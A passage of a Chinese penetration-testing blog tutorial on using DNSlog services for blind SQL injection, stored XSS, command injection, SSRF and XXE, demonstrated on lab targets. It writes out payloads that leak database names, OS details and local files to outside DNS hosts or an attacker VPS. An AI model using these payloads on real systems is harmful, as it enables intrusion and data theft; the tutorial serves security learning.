+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个表名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select table_name from information_schema.tables where table_schema&#x3D;datab ase() limit 0,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据表</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121147-cd72514c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138106175.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第二个数据列名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; limit 1,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据列</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121219-e0842648-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/1647413812656.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表‘admin’列‘username’第一个字段名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select username from maoshe.admin limit 0,1),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">通过修改 limit 0,1 可以获得不同数据</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121237-eb06c03a-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138155372.png" alt="img"></a></p>
+<h5 id="3-1-3-1-注意"><a href="#3-1-3-1-注意" class="headerlink" title="3.1.3.1.注意"></a>3.1.3.1.注意</h5><p>在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。</p>
+<h3 id="3-2-XSS盲打"><a href="#3-2-XSS盲打" class="headerlink" title="3.2.XSS盲打"></a>3.2.XSS盲打</h3><p>推荐：XSS绕过可以看看该文章：[XSS过滤绕过速查表](<a href="https://blog.csdn.net/weixin_50464560/article/d" target="_blank" rel="noopener">https://blog.csdn.net/weixin_50464560/article/d</a> etails/114491500)</p>
+<h4 id="3-2-1-介绍"><a href="#3-2-1-介绍" class="headerlink" title="3.2.1.介绍"></a>3.2.1.介绍</h4><p>简单来说，在xss上的利用是在于我们将xss的攻击代码拼接到dnslog网址的高级域名上，就可以在用户访问的时候，将他的信息带回来</p>
+<h4 id="3-2-2-过程"><a href="#3-2-2-过程" class="headerlink" title="3.2.2.过程"></a>3.2.2.过程</h4><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxx.ceye.io&gt;</span><br></pre></td></tr></table></figure>
+
+<p>让src请求我们的dnslog平台。这里举个例子：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121256-f6acd442-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138238620.png" alt="img"></a></p>
+<p>然后回来看DNSlog平台：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121313-00ea55d8-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138332709.png" alt="img"></a></p>
+<p>已经收到了请求，所以dns已经被解析</p>
+<p>这边再举一例：</p>
+<p>DNSlog平台先搞一个域名</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121330-0aa09808-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138394894.png" alt="img"></a></p>
+<p>在留言板里如下留言</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121343-12b3a800-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138431209.png" alt="img"></a></p>
+<p>登录后台查看</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121400-1ce24336-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138463926.png" alt="img"></a></p>
+<p>成功，这就是一个存储型xss盲打</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121416-2681077e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138506369.png" alt="img"></a></p>
+<h3 id="3-3-无回显的命令执行"><a href="#3-3-无回显的命令执行" class="headerlink" title="3.3.无回显的命令执行"></a>3.3.无回显的命令执行</h3><h4 id="3-3-1-介绍"><a href="#3-3-1-介绍" class="headerlink" title="3.3.1.介绍"></a>3.3.1.介绍</h4><p>我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功</p>
+<h4 id="3-3-2-过程"><a href="#3-3-2-过程" class="headerlink" title="3.3.2.过程"></a>3.3.2.过程</h4><p>发现疑似命令执行的洞，但是目标站点什么也不显示，无法确认是不是有洞</p>
+<p>如果是win系统，简单的<code>ping %os%.xxxx.cete.io</code>即可</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121446-3835f128-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138558443.png" alt="img"></a></p>
+<p>DNSlog这边得到了os的信息，那么就说明这里存在命令注入</p>
+<p>下面是windows的常用变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;变量                     类型       描述</span><br><span class="line">&#x2F;&#x2F;%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line">&#x2F;&#x2F;%CD%                     本地       返回当前目录字符串。</span><br><span class="line">&#x2F;&#x2F;%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class="line">&#x2F;&#x2F;%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line">&#x2F;&#x2F;%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class="line">&#x2F;&#x2F;%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line">&#x2F;&#x2F;%DATE%                   系统       返回当前日期。使用与 date &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class="line">&#x2F;&#x2F;%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line">&#x2F;&#x2F;%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line">&#x2F;&#x2F;%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class="line">&#x2F;&#x2F;%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class="line">&#x2F;&#x2F;%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class="line">&#x2F;&#x2F;%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class="line">&#x2F;&#x2F;%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class="line">&#x2F;&#x2F;%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line">&#x2F;&#x2F;%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line">&#x2F;&#x2F;%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line">&#x2F;&#x2F;%TIME%                   系统       返回当前时间。使用与time &#x2F;t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</span><br><span class="line">&#x2F;&#x2F;%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class="line">&#x2F;&#x2F;%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class="line">&#x2F;&#x2F;%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure>
+
+<p>如果目标系统是linux的话，则可用shell语言</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121511-470c148e-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138614997.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121524-4e842f62-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138648104.png" alt="img"></a></p>
+<p>或者</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121538-57260aaa-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138662414.png" alt="img"></a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121549-5dc55c44-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138682579.png" alt="img"></a></p>
+<h3 id="3-4-无回显的SSRF"><a href="#3-4-无回显的SSRF" class="headerlink" title="3.4.无回显的SSRF"></a>3.4.无回显的SSRF</h3><h4 id="3-4-1-介绍"><a href="#3-4-1-介绍" class="headerlink" title="3.4.1.介绍"></a>3.4.1.介绍</h4><p>这里先来介绍下这个漏洞：</p>
+<p>SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。</p>
+<p>攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。</p>
+<p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p>
+<p>介绍结束。</p>
+<p>那么当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多 。但是若遇到无回显的SSRF，这时就可以考虑用DNSlog来解决。</p>
+<h4 id="3-4-2-过程"><a href="#3-4-2-过程" class="headerlink" title="3.4.2.过程"></a>3.4.2.过程</h4><p>这里用的时CTFHub上面的一个SSRF靶场。<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">CTFHub</a></p>
+<p>一点击进去首页就是这样,看到这样的url便下意识想到ssrf</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121608-68f93004-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138711221.png" alt="img"></a></p>
+<p>这里因为是让我们从目标主机内网环境访问其本地的flag.php，那我们就构造：<code>/?url=http://127.0.0.1/flag.php</code></p>
+<p>然后就成功访问到了目标机本地的flag.php</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121625-736290bc-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138743211.png" alt="img"></a></p>
+<p>这种是有回显的，我们很容易就判断出来这里存在SSRF漏洞。那么如果这里是无回显的呢，那么该如何判断这里可能存在SSRF呢？那么在前期渗透的时候我们这里就可以用DNSlog来初步判断服务器有对外发送请求的行为，为下一步的SSRF渗透打下基础：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;http:&#x2F;&#x2F;hfsy89.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121638-7b0e9248-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138771739.png" alt="img"></a></p>
+<p>然后看我们的dnslog平台是否有服务器的IP来判断,这里就有可能有SSRF漏洞。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121702-8966768a-cd90-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138808365.png" alt="img"></a><br>但是要特别注意一点：<br>这样不能证明它一定能请求到内网，比如一些业务场景如人脸识别、图床、或者需要去外部加载资源等等，本身限制了访问内网ip，但是dnslog是在外网的，本身就可以访问的到。所以这里还有待继续研究。</p>
+<h3 id="3-5-无回显的XXE（Blind-XXE）"><a href="#3-5-无回显的XXE（Blind-XXE）" class="headerlink" title="3.5.无回显的XXE（Blind XXE）"></a>3.5.无回显的XXE（Blind XXE）</h3><h4 id="3-5-1-介绍"><a href="#3-5-1-介绍" class="headerlink" title="3.5.1.介绍"></a>3.5.1.介绍</h4><p>XXE漏洞全称（X ML External Entity Injection）即X ML外部实体注入漏洞，XXE漏洞发生在应用程序解析X ML输入时，没有禁止外部实体的加载（下面会介绍），导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p>
+<p>那么来介绍介绍外部实体的加载：</p>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。</p>
+<p>1.内部实体声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Johnson666&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们要引用上面两个实体,则:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;©right;&lt;&#x2F;author&gt;                 &#x2F;&#x2F;&amp;writer;相当于 &quot;Johnson666&quot;</span><br></pre></td></tr></table></figure>
+
+<p>2.外部实体声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;©right;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这两种引用的方式都为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;实体名;</span><br></pre></td></tr></table></figure>
+
+<p>以上为外部实体的加载。</p>
+<p>xxe如果前端页面都会有一个回显的话，我们可以很方便的进行文件读取，那前端页面要是不进行回显了，那我们怎么判断是否存在xxe漏洞了呢？这里就涉及了blind xxe(无回显的xxe)，其实利用dnslog就能进行判断，若dnslog有记录说明存在此漏洞。这里最关键的是证明存在后，怎么用blind xxe进行文件读取，这就涉及到用VPS了，下面我会介绍。</p>
+<h4 id="3-5-2-过程"><a href="#3-5-2-过程" class="headerlink" title="3.5.2.过程"></a>3.5.2.过程</h4><p>这里我以pikachu靶场为例：</p>
+<p>1.修改源码</p>
+<p>我们将源码中的输出语句进行注释，构成Blind XXE</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120008-2d00203c-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138858776.png" alt="img"></a></p>
+<p>这样再进行判断是否能输出解析的X ML语句，如下页面中就看到不了hi了</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120036-3d5e175e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138877460.png" alt="img"></a></p>
+<p>原本没修改源码前是可以看到的</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120058-4a95febe-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138907581.png" alt="img"></a></p>
+<p>2.漏洞验证</p>
+<p>在输入框中提交dnslog测试的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?X ML version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;gb2312&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY xi SYSTEM &quot;http:&#x2F;&#x2F;hfsy89.ceye.io&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;ξ&lt;&#x2F;login&gt;&lt;secret&gt;Any bugs?&lt;&#x2F;secret&gt;&lt;&#x2F;reset&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120120-576eaf00-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138934047.png" alt="img"></a></p>
+<p>然后去dnslog平台上查看，看到接收到了信息，说明漏洞真的存在</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120142-64d6ef0e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138957377.png" alt="img"></a></p>
+<p>3.文件读取</p>
+<p>这里需要一个VPS，VPS中放入一个DTD的文件，并在该文件所在目录开启一个web服务，我这里用的是python开启的</p>
+<p>a.dtd文件内如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.b ase64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;blind.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;vps的ip:6666&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的意思是：实体int为<code>http://vps的ip:6666/</code>，实体file为<code>file:///c:/windows/blind.txt</code>（经过b ase64编码），总体的意思就是访问vps的6666端口并携带本机的c:/windows/blind.txt的文件。</p>
+<p>python开启web服务，监听11111端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 11111</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120208-743d1342-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138985237.png" alt="img"></a></p>
+<p>这样就可以通过本机去访问这个web服务</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120257-918b3d66-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139006791.png" alt="img"></a></p>
+<p>然后再用python再开启一个端口，接收读取的目标服务器的数据，这里监听的是上面文件中写的6666端口</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120313-9ada9a92-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139022835.png" alt="img"></a></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?X ML version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;gb2312&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;vps ip:web端口&#x2F;a.dtd&quot;&gt;</span><br><span class="line">%xxe;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120325-a268683e-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139065207.png" alt="img"></a></p>
+<p>burp suite提交数据后，可能会无响应，这时只要刷新一下浏览器所在的web服务界面就行</p>
+<p>查看接收的数据</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120339-aa9f0e9a-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139103220.png" alt="img"></a></p>
+<p>我们将这个数据进行b ase64解码后查看，就是我们主机上的文件</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120400-b6c7e412-cd8e-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474139128777.png" alt="img"></a></p>
+<p>通过这样的方式，我们可以一直进行文件读取，直到读取到有用的数据，比如说公钥文件，就可能能进行远程连接ssh。</p>
+<p>参考链接：</p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10623583.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10623583.html</a></p>
+<p><a href="https://www.cnblogs.com/sstfy/p/10351807.html" target="_blank" rel="noopener">https://www.cnblogs.com/sstfy/p/10351807.html</a></p>
+<p><a href="https://xz.aliyun.com/t/9747" target="_blank" rel="noopener">https://xz.aliyun.com/t/9747</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    joker0xxx3
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://joker-vip.github.io/2022/03/15/DNSlog/" title="如何利用DNSlog进行更高效率的无回显渗透">http://joker-vip.github.io/2022/03/15/DNSlog/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dnslog/" rel="tag"><i class="fa fa-tag"></i> dnslog</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/15/burp%E4%B8%8Exray%E8%81%94%E5%8A%A8/" rel="next" title="burpsuite 配置xray代理">
+                <i class="fa fa-chevron-left"></i> burpsuite 配置xray代理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/03/15/burpSuite%E6%8A%80%E5%B7%A7/" rel="prev" title="浅析Burpsuite作战工具">
+                浅析Burpsuite作战工具 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="joker0xxx3" />
+            
+              <p class="site-author-name" itemprop="name">joker0xxx3</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+                <a href="/archives">
+                  <span class="site-state-item-count">150</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/joker-vip" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:2544684257@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/joker-vip/" target="_blank" title="博客园">
+                      
+                        <i class="fa fa-fw fa-refresh"></i>博客园</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://space.bilibili.com/247897008" target="_blank" title="BiliBili">
+                      
+                        <i class="fa fa-fw fa-refresh"></i>BiliBili</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+                
+                  <span class="links-of-blogroll-item">
+                    <a href="https://scholar10.github.io/" title="Sch0lar" target="_blank">Sch0lar</a>
+                  </span>
+                
+                  <span class="links-of-blogroll-item">
